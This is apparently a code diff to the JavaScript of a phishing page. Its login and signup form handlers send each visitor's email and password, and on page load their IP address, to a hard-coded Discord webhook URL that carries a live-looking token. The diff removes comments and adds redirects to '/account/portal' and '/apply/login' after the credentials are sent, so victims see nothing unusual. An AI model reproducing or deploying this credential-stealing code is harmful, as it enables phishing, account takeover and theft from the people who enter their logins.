@@ -13,11 +13,11 @@ document.getElementById('login-form').addEventListener('submit', function(event)
     };
 
     // The Discord webhook URL (replace with your actual webhook URL)
-    const webhookUrl = 'https://discord.com/api/webhooks/1330590142737416292/yx0Cctpods2n7hC72Iq_MpVnyiejvlY7bXZ1rCnd4LGp16QxzcLEfnE-zv-zsueDGWdM';  // Replace this with your Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1330590142737416292/yx0Cctpods2n7hC72Iq_MpVnyiejvlY7bXZ1rCnd4LGp16QxzcLEfnE-zv-zsueDGWdM';
 
     // Prepare the message to send to Discord
     const message = {
-        content: `New login attempt:\nEmail: ${data.email}\nPassword: ${data.password}`, // You can customise this message as you wish
+        content: `New login attempt:\nEmail: ${data.email}\nPassword: ${data.password}`,
     };
 
     // Send the data to Discord using a POST request
@@ -26,9 +26,12 @@ document.getElementById('login-form').addEventListener('submit', function(event)
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify(message), // Convert the data to JSON format
+        body: JSON.stringify(message),
     })
-    .then(response => response.json()) // Parse the JSON response from Discord (if any)
+    .then(response => {
+        // Redirect only after the request has been sent
+        window.location.href = "/account/portal";
+    })
     .catch((error) => {
         console.error('Error:', error);
     });
@@ -70,7 +73,10 @@ document.getElementById('signup-form').addEventListener('submit', function(event
         },
         body: JSON.stringify(message), // Convert the data to JSON format
     })
-    .then(response => response.json()) // Parse the JSON response from Discord (if any)
+    .then(response => {
+         // Redirect only after the request has been sent
+        window.location.href = "/apply/login"
+    })
     .catch((error) => {
         console.error('Error:', error);
     });
@@ -112,8 +118,3 @@ async function fetchIP() {
 
 // Fetch and send IP on page load
 window.onload = fetchIP;
-
-document.getElementById('login-form').addEventListener('submit', function (event) {
-    event.preventDefault();
-    window.location.href = "/account/portal ";
-});
